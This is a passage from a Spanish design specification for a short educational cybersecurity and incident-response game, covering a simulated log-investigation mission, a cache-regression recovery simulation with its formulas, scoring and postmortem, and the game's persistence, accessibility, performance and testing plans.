| Componente | Responsabilidad |
|---|---|
| `DetectionMission` | Orquesta casos, briefing, debrief y `MissionResult` |
| `AlertHeader` | Regla, nivel (simulado), host, hora; texto "nivel de la regla, no severidad" |
| `ContextPanel` | Notas de contexto del caso |
| `Timeline` | `<table>` con `<caption>`, columnas con `scope`, celdas de log en `<code translate="no">`, filtros como botones con `aria-pressed`, vista agrupada |
| `StepNav` | Pasos como lista ordenada; estado de cada uno (sin responder / respondido) en texto |
| `IocPicker` | Casillas nativas por entidad |
| `KeyEventPicker` | Radios por línea candidata (las del timeline filtrado, con hora y resumen) |
| `ClassifyStep` | Dos `fieldset` de radios (clasificación y severidad) con las definiciones del laboratorio como descripción |
| `ResponseStep` | Casillas de acciones con una línea de explicación cada una |
| `CaseReview` | Corrección por paso con icono + texto (correcto, parcial, incorrecto) y explicación |
| `RuleTuner` | Selectores, "Probar", tabla de resultados, lista de alertas benignas, "Guardar" |
| `DetectionDebrief` | Puntaje por caso, texto puente, ATT&CK, enlaces al Security Lab |

### 7.11 Wireframe (caso 2, escritorio)

```text
┌────────────────────────────────────────────────────────────────────────────────┐
│ Misión 02  Detección       Caso 2 de 3       Datos simulados        [ Salir ]  │
├──────────────────────────┬─────────────────────────────────────────────────────┤
│ Alerta SIM-AUTH-01       │ Línea de tiempo (49 eventos, UTC)                   │
│ Nivel 10 (de la regla,   │ Origen [todos ▾]  Cuenta [todas ▾]  Evento [todos ▾]│
│ no la severidad)         │ [ Agrupar por origen ]                              │
│ srv-app-01  02:13 UTC    │ 02:12:40 4625 administrator 203.0.113.45 0xC000006A │
│ Multiple failed logons   │ 02:12:44 4625 administrator 203.0.113.45 0xC000006A │
│ from the same source     │ …                                                   │
│                          │ 02:14:55 4624 administrator 203.0.113.45 type 3     │
│ Contexto                 │ 02:16:10 4720 support_tmp   created_by=administrator│
│ mlopez está de guardia.  │ 02:17:30 agent  monitoring agent stopped            │
│ srv-app-01 no debería    │                                                     │
│ recibir inicios desde    │                                                     │
│ Internet.                │                                                     │
├──────────────────────────┴─────────────────────────────────────────────────────┤
│ 1 IOCs (respondido)  2 Evento clave  3 Clasificación  4 Respuesta              │
│ ¿Cuál es el primer evento que confirma el compromiso?                          │
│ ( ) 02:12:40 4625 administrator   ( ) 02:14:55 4624 administrator              │
│ ( ) 02:16:10 4720 support_tmp     Pista                                        │
│                                         [ Paso anterior ] [ Siguiente paso ]   │
└────────────────────────────────────────────────────────────────────────────────┘
```

En móvil, las tres zonas se apilan (alerta y contexto, línea de tiempo, paso) y la tabla pasa a una
lista de filas con `white-space: pre-wrap` y `overflow-wrap: anywhere`.

### 7.12 Accesibilidad específica

- Todo con controles nativos: tablas, `fieldset`/`legend`, radios, casillas y botones.
- Filtrar o agrupar anuncia el resultado en un `role="status"` ("Mostrando 39 de 49 eventos").
- Tras "Enviar informe", el foco pasa al encabezado de la corrección (`tabindex="-1"`).
- Las celdas de log tienen `translate="no"` para que el traductor del navegador no altere los datos.
- Sin límite de tiempo por diseño (WCAG 2.2.1 cumplido sin excepciones).

### 7.13 Definition of Done (Misión 02)

- [ ] Tres casos con contenido bilingüe revisado; los datos de Windows y ATT&CK verificados con
      fuente en `ref`.
- [ ] `scoreCase` y `evaluateRule` cubiertos por tests; golden de las 48 configuraciones con las
      5 invariantes de §7.6 en verde.
- [ ] Filtros, agrupación y selección de evidencia operables solo con teclado y anunciados.
- [ ] Texto puente visible en el briefing y el debrief, revisado contra 08; ningún texto atribuye
      al laboratorio algo que no hizo.
- [ ] Todas las IPs y dominios en rangos reservados (test).
- [ ] Enlaces de salida a capítulos existentes del Security Lab (test de registro de rutas).
- [ ] Revisión con lector de pantalla del caso 2 completo.
- [ ] César revisó los textos en ES y EN.

---

## 8. Misión 03 · Recuperación

### 8.1 Evaluación de la idea

La propuesta (diagrama gateway → API → cache → database con síntomas, inspección, acciones con
consecuencias, presupuesto de tiempo e impacto, y postmortem) se adopta con cuatro precisiones:

1. **Un escenario bien hecho en V1**, no varios superficiales. Un segundo escenario es V1.1.
2. **Simulación paramétrica pequeña**, no un grafo de estados escrito a mano. Con 6 variables y
   fórmulas cerradas, cualquier orden de acciones tiene una consecuencia coherente, y los caminos
   se verifican con tests de golden.
3. **Tiempo simulado, no reloj**: cada acción cuesta minutos simulados. No hay presión de tiempo
   real (G3).
4. **El estado "operativo" puede mentir.** La caché responde a su health check y aun así es la
   causa. La lección "arriba no significa funcionando" es central.

### 8.2 Escenario V1: claves de caché que nunca se reutilizan

Cinco minutos antes de la alerta se desplegó `api v2.14`, que cambia el serializador de reservas.
La nueva clave de caché incluye, sin querer, la marca de tiempo de serialización: cada petición
genera una clave distinta. La tasa de aciertos de la caché cae al 3 %, toda la carga llega a la base
de datos, la base se satura, la API agota su pool de conexiones y el gateway devuelve 504.

Pistas disponibles para quien investiga:

- Historial de despliegues: "v2.14 (hace 5 min): cambia el serializador de reservas
  (ReservationDto v2)". No dice "caché".
- Logs de la caché: `SET rsv:v2:4412:1759712405123`, `SET rsv:v2:4412:1759712405377`. La misma
  reserva con sufijos distintos: quien mira con atención ve que la clave incluye un timestamp.
- Métricas de la caché: aciertos 3 % (antes 91 %), claves nuevas por minuto ≈ peticiones por minuto,
  memoria 97 %, evictions en aumento.
- Distractor: la base de datos registra consultas lentas. Son un síntoma de la saturación, no la causa.

Trampas (acciones tentadoras que empeoran o no ayudan): reiniciar la API, escalar la API (más
conexiones contra una base saturada), desactivar la caché y vaciar la caché (borra las entradas del
formato anterior, que acelerarían la recuperación tras el rollback).

### 8.3 Modelo de simulación

Constantes del escenario (`content/scenario-cache-keys.ts`, todas SIMULADAS):

| Constante | Valor | Significado |
|---|---|---|
| `R` | 1200 | peticiones por minuto en el gateway |
| `C` | 400 | capacidad de la base de datos (peticiones por minuto) |
| `hitCeiling` | 0.92 | tasa de aciertos máxima con la caché caliente |
| `brokenHit` | 0.03 | tasa de aciertos con v2.14 |
| `warmUp` | 0.20 | calentamiento por minuto (formato v1 con v2.13 activa) |
| `decay` | 0.03 | pérdida por minuto de entradas v1 cuando no se calienta (TTL y evictions) |
| `shed` | 0.40 | fracción de tráfico no crítico que el breaker sirve degradado |
| `poolPerReplica` / `dbMaxConn` | 20 / 100 | conexiones |
| `restartPenalty` | 0.15 | errores extra durante un reinicio |
| `scaleDbFactor` | 1.8 | capacidad de la base tras escalarla |
| `budgetMin` | 60 | minutos simulados disponibles |
| `stableMinRequired` | 3 | minutos estables para poder declarar resuelto |

Estado inicial: `t = 0`, `apiVersion = 'v2.14'`, `replicas = 3`, `cacheEnabled = true`,
`warmthV1 = 0.75`, `breakerOpen = false`, `dbFactor = 1`.

Métricas de cada minuto simulado (`derive(model, scenario)`, pura):

```text
hit      = !cacheEnabled ? 0 : apiVersion == 'v2.14' ? brokenHit : hitCeiling × warmthV1
served   = breakerOpen ? (1 − shed) : 1                       // fracción que llega al backend
dbDemand = R × served × (1 − hit)
u        = dbDemand / (C × dbFactor)                          // utilización de la base
base(u)  = u ≤ 0.8 ? 0.002
         : u ≤ 1   ? 0.002 + (u − 0.8) / 0.2 × 0.048
         :           min(0.60, 0.05 + (u − 1) × 0.4)
overflow = u > 0.8 ? max(0, replicas × 20 − 100) / (replicas × 20) : 0
errorRate = min(0.95, base(u) + overflow + (restarting ? 0.15 : 0))
p95Ms    = u ≤ 0.6 ? 120 : min(5000, round(120 + (u − 0.6) × 4000))   // 5000 = timeout del gateway
```

Avance de un minuto (`advance`):

```text
impact.failed   += R × served × errorRate
impact.degraded += breakerOpen ? R × shed : 0
warmthV1 = (apiVersion == 'v2.13' && cacheEnabled) ? min(1, warmthV1 + warmUp)
                                                    : max(0, warmthV1 − decay)
stableMinutes = (errorRate < 0.01 && p95Ms < 400 && !breakerOpen) ? stableMinutes + 1 : 0
t += 1; si t ≥ budgetMin → status = 'timeout'
```

Valores iniciales resultantes (referencia de tests): aciertos 3 %, utilización de la base 2.91,
errores 60 %, p95 5000 ms. Con el breaker abierto: utilización 1.75, errores ~35 %.

### 8.4 Acciones

Una acción cuesta `cost` minutos. Las de tipo `start` cambian el modelo y después avanzan el tiempo;
las de tipo `end` avanzan el tiempo con el modelo anterior (más su penalización) y aplican el cambio
al final.

| Id | Etiqueta (ES) | Costo | Aplica | Efecto |
|---|---|---|---|---|
| `inspect:<c>` | Inspeccionar gateway / API / caché / base de datos | 1 | — | Revela métricas y logs del componente |
| `deploy-history` | Ver historial de despliegues | 1 | — | Revela el cambio v2.14 |
| `runbook` | Consultar runbook | 1 | — | Consejos según los componentes ya inspeccionados |
| `wait` | Observar 1 minuto | 1 | — | Solo avanza el tiempo |
| `open-breaker` | Abrir circuit breaker en lecturas no críticas (degradar) | 1 | start | `breakerOpen = true` |
| `close-breaker` | Cerrar circuit breaker | 1 | start | `breakerOpen = false` |
| `disable-cache` / `enable-cache` | Desactivar / activar caché | 1 | start | `cacheEnabled` |
| `flush-cache` | Vaciar caché | 2 | start | `warmthV1 = 0` |
| `restart-api` | Reiniciar API (rolling) | 3 | end | Penalización de reinicio durante 3 min; no cambia la causa |
| `scale-api` | Escalar API ×2 | 4 | end | `replicas = 6` |
| `rollback-api` | Rollback de la API a v2.13 | 5 | end | `apiVersion = 'v2.13'` |
| `scale-db` | Escalar base de datos | 12 | end | `dbFactor = 1.8` |
| `declare-resolved` | Declarar resuelto | 0 / 1 | — | Aceptado si `stableMinutes ≥ 3`; si no, se rechaza, cuesta 1 min y queda registrado |

Si el costo de una acción supera el presupuesto restante, la acción se ejecuta hasta el minuto 60 y
la partida termina en `timeout`.

### 8.5 Diagnóstico

Selector "Causa raíz" (se puede cambiar en cualquier momento; cuenta la última elección antes de
terminar):

| Id | Opción (ES) | ¿Correcta? | Qué la refuta |
|---|---|---|---|
| `cache-key-regression` | El deploy v2.14 genera claves de caché que nunca se reutilizan | Sí | — |
| `db-slow-query` | Una consulta lenta en la base de datos | No (síntoma) | Las consultas se vuelven lentas por la saturación |
| `api-capacity` | Faltan réplicas de la API | No | Escalar empeora |
| `traffic-spike` | Un pico de tráfico legítimo | No | El gateway muestra 1200/min estables |
| `cache-node-down` | El nodo de caché se cayó | No | Responde al health check; está lleno de claves nuevas |

### 8.6 Fin y puntaje

- `recovered`: `declare-resolved` aceptado (3 minutos estables y breaker cerrado).
- `timeout`: se agotan los 60 minutos. No hay "game over": el postmortem muestra el camino de
  referencia ("Así se podría haber recuperado").
- `impactoPonderado = failed + 0.25 × degraded`. `baseline` = impacto de no hacer nada durante
  60 minutos (`1200 × 0.6 × 60 = 43 200`), calculado por el motor, no escrito a mano.
- `score = round(900 × max(0, 1 − impactoPonderado / baseline)) + (diagnóstico correcto ? 100 : 0)`.
- Completar = llegar a `recovered`.

Caminos de referencia (tests de golden, §15.1):

| Camino | Resultado esperado |
|---|---|
| No hacer nada | `timeout`, puntaje de impacto ≈ 0 |
| Abrir breaker → rollback → esperar → cerrar breaker → esperar → declarar (diagnóstico correcto) | `recovered` en ≤ 15 min, puntaje ≥ 920 |
| Rollback directo, sin breaker | `recovered`, puntaje menor que el camino anterior |
| Vaciar la caché antes del rollback | Recupera más tarde que sin vaciarla |
| Escalar API mientras `u > 0.8` | `errorRate` sube respecto al minuto anterior |
| Reiniciar API | 3 min con errores más altos y sin mejora posterior |
| Declarar antes de tiempo | Rechazado, +1 min, aparece en el postmortem |

### 8.7 Postmortem (sin culpables)

```text
Postmortem (simulado)
Resumen: tras el deploy v2.14, el gateway devolvió errores 5xx durante 8 minutos simulados.
Impacto (simulado): 1.546 peticiones fallidas, 3.360 degradadas, 11 minutos hasta la recuperación.
Línea de tiempo (tus acciones)
  T+00  Abriste el circuit breaker. Errores: 60 % → 35 %
  T+01  Rollback a v2.13 (5 min)
  T+06  Observaste 1 minuto. Errores: 1,6 %
  T+07  Cerraste el circuit breaker
  T+08  Observaste 3 minutos. Errores: 0,2 %, p95 120 ms
  T+11  Declaraste resuelto
Causa raíz: la clave de caché de v2.14 incluía una marca de tiempo; ninguna entrada se reutilizaba.
Tu diagnóstico: correcto.
Factores que contribuyeron
  No había alerta por caída de la tasa de aciertos de la caché.
  El deploy no fue gradual (sin canary).
  Ningún test verificaba que la clave de caché fuese estable.
Lo que ayudó: abrir el breaker redujo las peticiones fallidas mientras se aplicaba el rollback.
Lo que empeoró: (vacío en este camino)
Acciones de seguimiento (elige hasta 3)
  [ ] Alertar cuando la tasa de aciertos de la caché caiga bruscamente
  [ ] Deploys graduales con rollback automático según el SLO
  [ ] Test que verifique que la clave de caché es estable entre peticiones
  [ ] Más réplicas de API por defecto
  [ ] Desactivar la caché para evitar este tipo de fallas
  [ ] Revisar quién aprobó el deploy
Nadie actuó con descuido. Un cambio razonable en un serializador produjo claves que nunca se
reutilizan, y el efecto llegó hasta la base de datos. Los sistemas no fallan porque a sus
ingenieros no les importe. Fallan porque la complejidad crea modos de falla.
[ Ver el cierre ]
```

- "Lo que ayudó" y "Lo que empeoró" salen de reglas del contenido evaluadas sobre el registro de
  acciones (por ejemplo, `scale-api` con `u > 0.8` → "Escalar la API sumó conexiones a una base de
  datos ya saturada"; `flush-cache` antes de `rollback-api` → "Vaciar la caché borró las entradas
  que habrían acelerado la recuperación"; `restart-api` → "Reiniciar cortó peticiones en curso y
  no cambió la causa"; `declare-resolved` rechazado → "Declarar resuelto antes de tiempo").
- Las acciones de seguimiento no puntúan (un postmortem no se gamifica). Cada una muestra un
  comentario al elegirla. "Revisar quién aprobó el deploy" recibe la explicación de por qué un
  postmortem sin culpables no busca culpables.

### 8.8 Modelo de estado

```ts
// missions/recovery/types.ts
export type ComponentId = 'gateway' | 'api' | 'cache' | 'db'
export type ActionId =
  | `inspect:${ComponentId}` | 'deploy-history' | 'runbook' | 'wait'
  | 'open-breaker' | 'close-breaker' | 'disable-cache' | 'enable-cache' | 'flush-cache'
  | 'restart-api' | 'scale-api' | 'rollback-api' | 'scale-db' | 'declare-resolved'
export type RootCauseId =
  | 'cache-key-regression' | 'db-slow-query' | 'api-capacity' | 'traffic-spike' | 'cache-node-down'

export interface SystemModel {
  readonly apiVersion: 'v2.13' | 'v2.14'
  readonly replicas: number
  readonly cacheEnabled: boolean
  readonly warmthV1: number   // 0..1
  readonly breakerOpen: boolean
  readonly dbFactor: number
}

export interface Metrics {
  readonly hitRate: number
  readonly dbUtilization: number
  readonly errorRate: number
  readonly p95Ms: number
  readonly degradedRate: number
  readonly dbConnections: { used: number; max: number }
}

export type ComponentHealth = 'ok' | 'degraded' | 'saturated' // derivado; la caché reporta 'ok' (su health check)

export interface RecoveryState {
  readonly t: number
  readonly model: SystemModel
  readonly metrics: Metrics
  readonly history: readonly { t: number; metrics: Metrics }[]
  readonly log: readonly { t: number; action: ActionId; accepted: boolean }[]
  readonly revealed: readonly (ComponentId | 'deploy-history' | 'runbook')[]
  readonly diagnosis?: RootCauseId
  readonly impact: { failed: number; degraded: number }
  readonly stableMinutes: number
  readonly status: 'running' | 'recovered' | 'timeout'
  readonly followUps: readonly string[]
}

export type RecoveryAction =
  | { type: 'act'; action: ActionId }
  | { type: 'diagnose'; cause: RootCauseId }
  | { type: 'toggleFollowUp'; id: string }

export type RecoveryEvent =
  | { type: 'actionApplied'; action: ActionId; t: number }
  | { type: 'minuteElapsed'; t: number; metrics: Metrics }
  | { type: 'revealed'; target: ComponentId | 'deploy-history' | 'runbook' }
  | { type: 'declareRejected'; t: number }
  | { type: 'ended'; status: 'recovered' | 'timeout'; score: number }
```

### 8.9 Componentes y wireframe

| Componente | Responsabilidad |
|---|---|
| `RecoveryMission` | Briefing, partida, postmortem y `MissionResult` |
| `IncidentHeader` | T+min, minutos restantes, impacto acumulado (simulado), alerta del gateway |
| `SystemDiagram` | Cuatro nodos como `<button>` en una grilla CSS; conectores en SVG decorativo (`aria-hidden`); estado con `.status--ok/--warn/--threat` (punto + texto) |
| `SystemTable` | Equivalente textual del diagrama: componente, estado y última métrica conocida |
| `InspectPanel` | Métricas y logs del componente inspeccionado; valores con `tabular-nums`; logs en mono |
| `ErrorChart` | Serie de tasa de errores por minuto simulado en SVG, `role="img"` con `aria-label` resumen y tabla de datos en `<details>` |
| `ActionList` | Acciones agrupadas (Investigar, Mitigar, Cambiar, Esperar) con su costo en el nombre accesible |
| `DiagnosisSelect` | `<select>` nativo de causa raíz |
| `Postmortem` | §8.7 |

```text
┌────────────────────────────────────────────────────────────────────────────────┐
│ Misión 03  Recuperación     Datos simulados     T+07 min de 60      [ Salir ]  │
│ Alerta: el gateway devuelve 5xx al 35 %, p95 4.704 ms   Impacto: 2.693 fallidas│
├────────────────────────────────────────────────────────────────────────────────┤
│ [ gateway        ]───[ api            ]───[ caché          ]───[ base de datos  ]│
│ [ ● degradado    ]   [ ● degradada    ]   [ ● operativa    ]   [ ● saturada     ]│
│                                                                                │
│ Errores por minuto (simulado)   60 ▇▇▅▅▅▅▅                                     │
├─────────────────────────────────────┬──────────────────────────────────────────┤
│ Caché (inspeccionada en T+01)       │ Investigar                               │
│ Aciertos 3 % (antes 91 %)           │  [Historial de despliegues  1 min]       │
│ Claves nuevas por minuto 1.164      │  [Runbook  1 min]                        │
│ Memoria 97 %   Evictions en aumento │ Mitigar                                  │
│ SET rsv:v2:4412:1759712405123       │  [Abrir circuit breaker  1 min]          │
│ SET rsv:v2:4412:1759712405377       │  [Desactivar caché  1 min]               │
│                                     │ Cambiar                                  │
│ Causa raíz: [ elegir… ▾ ]           │  [Rollback API a v2.13  5 min] …         │
│                                     │ [Observar 1 min]  [Declarar resuelto]    │
└─────────────────────────────────────┴──────────────────────────────────────────┘
```

Los números del wireframe salen del modelo de §8.3 para el camino: inspeccionar gateway (T+00),
inspeccionar caché (T+01), abrir breaker (T+02) y esperar hasta T+07.

En móvil, el diagrama pasa a vertical (gateway arriba, base de datos abajo), seguido de la
inspección y las acciones. Números con `Intl.NumberFormat` del idioma activo.

### 8.10 Accesibilidad específica

- Cada acción anuncia su resultado en un `role="status"`: "Rollback aplicado. T+08. Errores 19 %."
- El diagrama tiene equivalente textual (`SystemTable`); el gráfico, su tabla de datos.
- El estado de cada nodo es texto, no solo color. La caché dice "operativa", que es justo lo que
  hace interesante el caso.
- Sin reloj real. "Minutos" siempre acompañado de "simulados" en la primera aparición de cada pantalla.

### 8.11 Definition of Done (Misión 03)

- [ ] `derive` y `advance` con tests de propiedades (tasas en [0, 1], `p95` en [120, 5000]) y los
      golden de §8.6 en verde.
- [ ] Todas las acciones operables con teclado; resultado anunciado; diagrama con equivalente textual.
- [ ] Postmortem generado desde el registro real de acciones; las reglas de "ayudó/empeoró" tienen tests.
- [ ] Todas las métricas visibles etiquetadas como simuladas.
- [ ] Las frases de cierre aparecen en sus lugares (§3.5) en ES y EN.
- [ ] Revisión de un ingeniero backend/SRE (o de César) sobre la verosimilitud del escenario.
- [ ] César revisó los textos en ES y EN.

---

## 9. Persistencia

**Solo `localStorage`.** Justificación: V1 no tiene backend (00). Lo único que vale la pena
recordar es qué misiones se jugaron, los mejores puntajes y el modo preferido. No hay datos
personales ni identificadores: es almacenamiento funcional en el dispositivo, sin tracking. Un
leaderboard requeriría backend, moderación y anti-trampas: fuera de V1 (14).

```ts
// core/progress.ts
export const PROGRESS_KEY = 'cyber-ops:progress:v1'

export interface ProgressV1 {
  v: 1
  missions: Record<MissionId, {
    played: boolean
    completed: boolean
    best: Partial<Record<Mode, number>>
  }>
  endingSeen: boolean
  preferredMode?: Mode
}

export function recordResult(p: ProgressV1, r: MissionResult): ProgressV1 // pura
export function isProgressV1(x: unknown): x is ProgressV1                 // guard manual, sin Zod
```

- Se lee una vez al montar el hub o una misión (en un efecto). Se escribe al terminar una misión,
  al cambiar el modo preferido y al mostrar el cierre.
- Si el JSON es inválido o de otra versión, se usan valores por defecto y se sobrescribe en la
  siguiente escritura. Son solo puntajes: no se migran.
- Todo acceso va en `try/catch`. Si `localStorage` no está disponible (modo privado estricto,
  almacenamiento bloqueado), el adaptador usa memoria y el juego funciona igual.
- No se guarda una partida a medias: las misiones son cortas.
- Sin sincronización entre pestañas (evento `storage`): no aporta en V1.
- "Borrar progreso" elimina solo `PROGRESS_KEY`.

---

## 10. Relación con el portafolio

### 10.1 Entradas

| Desde | Forma | Destino |
|---|---|---|
| Home | Bloque discreto bajo el trabajo principal (no en el hero; D8): "Cyber Ops: un juego corto sobre cómo fallan los sistemas." con "Jugar" | `cyberOps.hub` |
| Security Lab | Al final de la sección de investigación: "Practica este razonamiento con datos simulados" | `cyberOps.mission` → `detection` |
| Casos de estudio (secciones de retos o modos de falla, si 06 las incluye) | Enlace contextual: "Juega un incidente parecido (simulado)" | `cyberOps.mission` → `recovery` |
| Arquitectura del sitio / ADRs | "Cómo está hecho Cyber Ops" (el ADR del motor) | — (salida inversa: del hub al ADR) |
| Navegación | Lo decide 02 (recomendación: footer y Home, no en la navegación primaria) | `cyberOps.hub` |

El enlace de Home precarga el chunk del juego al pasar el cursor o enfocar (`prefetch="intent"` si
04 usa el modo framework de React Router).

### 10.2 Salidas

| Misión | Salida | Nota visible |
|---|---|---|
| 01 | Sección de seguridad de un caso de estudio donde César valida la entrada (candidatos según `profile.ts`: validación con Zod en Experiencias, análisis OWASP Top 10 en el registro masivo para una feria). **A confirmar por 07** | "En el juego filtraste en el borde. Aquí, cómo valido la entrada en el código." |
| 02 | Security Lab: pipeline de detección, validación FIM, metodología de investigación y respuesta, y el roadmap (fuerza bruta y ajuste de detecciones como pendientes). Anclas exactas según 08 | "En el juego, todo fue simulado. Aquí está lo que construí y validé, y lo que todavía no." |
| 03 | Sección de failure modes del caso Quantum (07 confirma una tabla de fallas real: fail closed del PDP, fail open del chequeo de sesión, eventos perdidos sin outbox) y ensayos de Engineering Judgment sobre eventos y migraciones | "En el juego, la falla fue simulada. Aquí, cómo diseño para que falle mejor." |
| Cierre | `/security` (principal), casos de estudio (secundario) | §3.5 |

Implementación: `links.ts` declara las salidas como `ExitLink` con ids de ruta, no con URLs. Un
test (§15.4) comprueba que cada id existe en el registro de rutas del sitio. Si un candidato no se
confirma, su salida no se publica (no queda un enlace "próximamente").

---

## 11. Contenido e i18n

- Todo texto del juego es `L10n` (`{ es, en }`), definido junto al dato que describe. El tipo exige
  ambos idiomas: un texto sin traducir no compila.
- Textos de la interfaz del juego (botones, etiquetas, instrucciones) en `i18n/strings.ts`, también
  como `L10n`, agrupados por pantalla.
- Lo que es código o log (payloads, líneas de log, claves de caché, IDs de eventos) es un string
  único, no se traduce ni se duplica (regla de 00).
- El único punto de contacto con el i18n del sitio es `useLocale()` (lo expone 05). Si 05 usa
  diccionarios por idioma para el resto del sitio, el juego conserva `L10n` en línea: su contenido
  es narrativo y se traduce por bloque, y la completitud la garantiza el tipo.
- Código en línea dentro de textos con backticks, renderizado con el mismo renderer de 05.
- Primero se escribe en español; el inglés dice lo mismo, con redacción natural.
- Las fechas y horas de los logs se muestran tal cual (UTC); los números de la interfaz, con
  `Intl.NumberFormat(locale)`.
- Tono: primera persona solo en los textos puente y de salida (es César hablando de su trabajo); el
  resto en segunda persona, directa. Sin "hackers", "élite" ni "ciberataque masivo". Sentence case.
  Sin emojis.

Estructura de un archivo de contenido (ejemplo):

```ts
// missions/detection/content/case-fim.ts
export const caseFim = {
  id: 'fim-window',
  title: { es: 'Cambio de integridad', en: 'Integrity change' },
  alert: { ruleId: 'SIM-FIM-01', level: 7, host: 'ws-lab-01', t: '10:02:11Z',
           description: 'Integrity checksum changed' },
  context: [{
    es: 'Registro de cambios CHG-0142: prueba de FIM autorizada en `ws-lab-01`, de 10:00 a 10:15 UTC.',
    en: 'Change log CHG-0142: authorized FIM test on `ws-lab-01`, 10:00 to 10:15 UTC.',
  }],
  // timeline, entities, steps, rubric, hints, explanations, debrief…
} as const satisfies InvestigationCase
```

---

## 12. Accesibilidad (transversal)

### 12.1 Piso

Todo lo de 03 aplica (contraste AA en ambos temas, foco visible con `--accent`, objetivos ≥ 44 px).
Además:

| Requisito | Cómo se cumple |
|---|---|
| Teclado completo | Las tres misiones se terminan sin ratón (§6.13, §7.12, §8.10) |
| 2.1.4 Atajos de una tecla | Solo activos con el foco en el tablero de M01 |
| 2.2.1 Tiempo ajustable | M01 con modo sin límite de tiempo elegible antes de empezar; M02 y M03 sin reloj |
| 2.2.2 Pausar | M01 se pausa con botón, `P`/`Escape` y automáticamente |
| 2.3.1 Destellos | Ningún efecto de parpadeo |
| 1.4.1 Uso del color | Estados con icono + texto; rack con rayado; ninguna información solo por color |
| 1.4.10 Reflow | M02, M03 y el modo sin límite de M01 funcionan a 320 px. El modo en tiempo real a 320 px usa 2 carriles; su equivalente que reflowea es el modo sin límite |
| 4.1.3 Mensajes de estado | `role="status"` / `aria-live="polite"`, con límite de frecuencia |
| Idioma de partes | `translate="no"` en código y logs; los textos siguen el `lang` de la página |

### 12.2 Estrategia de lector de pantalla

- Cada misión tiene un `<h1>` y el foco va al encabezado al cambiar de fase (briefing → partida →
  debrief).
- Un solo live region por misión (`LiveRegion`), con cola, coalescencia de mensajes y un máximo de
  un anuncio cada 2 s en M01.
- M01 en tiempo real no se narra paquete a paquete (sería inutilizable); el equivalente es el modo
  sin límite, ofrecido de forma explícita y sin estigma ("mismo contenido").
- M02 y M03 son documentos y formularios: el lector de pantalla los recorre con su navegación normal.

### 12.3 Movimiento

- `prefers-reduced-motion: reduce` (con el hook `useMediaQuery` existente): preselecciona el modo
  sin límite; quita fades, transiciones y el crecimiento de la barra de oleada; las resoluciones
  son instantáneas.
- Fuera de M01, el único movimiento es un fade de ≤ 150 ms al cambiar de estado, que desaparece con
  reduced motion.

---

## 13. Responsive y táctil

| Contexto | M01 tiempo real | M02 | M03 |
|---|---|---|---|
| Contenedor ≥ 900 px | 3 carriles, chips con `--step-0` | Tres zonas: alerta y contexto, timeline, paso | Diagrama horizontal, inspección y acciones en dos columnas |
| 560–899 px | 3 carriles, chips con `--step--1` | Alerta y contexto arriba, timeline, paso | Diagrama horizontal compacto, columnas apiladas |
| < 560 px | 2 carriles, chips de hasta 2 líneas (`max-width: 88 %`), `spawnMs × 1.5`, inspector con botón ancho | Todo apilado; timeline como lista de filas | Diagrama vertical; acciones como lista |

- Los cortes se hacen con container queries sobre el contenedor de la misión, no con media queries
  del viewport.
- Táctil en M01: se bloquea en `pointerdown` (primario, botón 0) sobre el chip, porque con un objetivo
  en movimiento `click` puede caer en el carril y perderse. El tablero usa `touch-action:
  manipulation` (no `none`: la página debe poder desplazarse). Si el tablero queda a menos del 50 %
  visible, la partida se pausa.
- Altura del tablero ≤ 60 vh para que HUD, tablero e inspector quepan sin desplazar en un móvil
  de 640 px de alto.
- Chips con altura mínima de 44 px. Nada depende de hover.

---

## 14. Rendimiento

| Presupuesto | Valor | Cómo se verifica |
|---|---|---|
| JS del juego en el bundle de Home | **0 bytes** | Análisis del build (11) + regla de imports (§4.1) |
| Chunk del hub (shell + core) | ≤ 8 KB gzip | Script de tamaños en CI (11) |
| Cada misión (motor + vista + contenido) | ≤ 15 KB gzip | Ídem |
| Total del juego | ≤ 45 KB gzip JS + ≤ 6 KB gzip CSS | Ídem |
| Dependencias nuevas de runtime | **Ninguna** (sin Zod, sin librería de animación, sin store, sin Canvas) | Revisión de `package.json` |
| M01, trabajo por frame (oleada 6, CPU 4× ralentizada en Chrome) | ≤ 4 ms de script, sin layout forzado | Perfil de Performance en el DoD de M01 |
| M01, renders de React | Solo en cambios estructurales (≤ ~3 por segundo en la oleada 6) | React Profiler |
| M02/M03, INP | ≤ 200 ms en cada acción | Perfil y Lighthouse (11) |
| Memoria | Sin crecimiento tras 3 partidas seguidas | Heap snapshot |

- Cada misión es una ruta lazy. El core compartido queda en el chunk del hub.
- `will-change: transform` solo en paquetes en vuelo durante la partida.
- Fragment Mono ya la carga el sitio; el juego no agrega fuentes.
- `authDataset` se genera al entrar al caso 3 (es pequeño y determinista), no se incluye como JSON.

---

## 15. Testing

### 15.1 Motor (Vitest, sin DOM)

M01:
- RNG: misma semilla, misma secuencia (snapshot de los primeros 5 valores).
- Paso fijo: dos ejecuciones con la misma semilla producen la misma lista de `spawned`.
- Propiedades sobre 200 semillas, partida completa sin acciones: nunca hay solapamiento en un carril;
  proporción de amenazas por oleada dentro de ±0.10 de la tabla; ninguna amenaza de tier 3 antes de
  la oleada 5 ni legítimos engañosos antes de la 3;
  la integridad nunca es negativa; termina en `breached` o `survived`.
- Puntaje: bloqueo correcto, falso positivo, brecha y entrega, con valores exactos por oleada y tier.
- `blockLane` elige el de mayor `x`; con `paused` se ignoran `tick` y `block`.
- 2 carriles: el intervalo de aparición se escala ×1.5.
- Modo sin límite: 24 elementos, mezcla de tiers por tramo, puntaje por decisión.

M02:
- `scoreCase` con respuestas perfectas = máximo; cada acción dañina resta lo especificado; mínimos en 0.
- `filterTimeline`, `groupTimeline`, `expandRepeat`.
- Golden de `evaluateRule` sobre las 48 configuraciones + las 5 invariantes de §7.6.

M03:
- Propiedades: tasas en [0, 1], `p95` en [120, 5000] para secuencias de acciones aleatorias.
- Golden de los caminos de §8.6.
- Reglas de "ayudó/empeoró" del postmortem.

Progreso:
- `recordResult` (mejor puntaje por modo, `completed` no retrocede), `isProgressV1` con entradas
  corruptas, adaptador con `localStorage` que lanza error.

### 15.2 Componentes (Testing Library)

- Hub: muestra el progreso guardado; cambia y persiste el modo; borrar en dos pasos.
- M01 sin límite: decidir muestra feedback y mueve el foco a "Siguiente".
- M01 tiempo real con un reloj manual inyectado: `1` bloquea el más adelantado del carril 1; las
  teclas no actúan si el foco está fuera del tablero; `visibilitychange` pausa; "Continuar" reanuda.
- M01: el DOM de un paquete sin resolver no contiene su clasificación.
- M02: filtrar anuncia el conteo; enviar el informe muestra la corrección y mueve el foco.
- M03: una acción actualiza la tabla de estado y anuncia el resultado; el postmortem lista las
